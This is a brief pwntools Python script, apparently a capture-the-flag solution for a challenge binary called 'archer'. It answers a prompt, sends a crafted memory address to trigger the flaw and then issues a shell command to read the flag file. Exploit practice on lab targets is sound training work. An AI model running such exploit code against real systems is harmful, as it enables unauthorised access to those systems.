#!/usr/bin/python3
from pwn import *

if args.REMOTE:
    r = remote(args.HOST, int(args.PORT))
else:
    r = process("./src/archer")

r.recvuntil(b": ")
r.sendline(b"yes")
r.clean()
r.sendline(b"0xfffffffffff04068")
r.clean()
r.sendline(b"cat /pwn/flag* 2>/dev/null")
print(r.recv().decode())
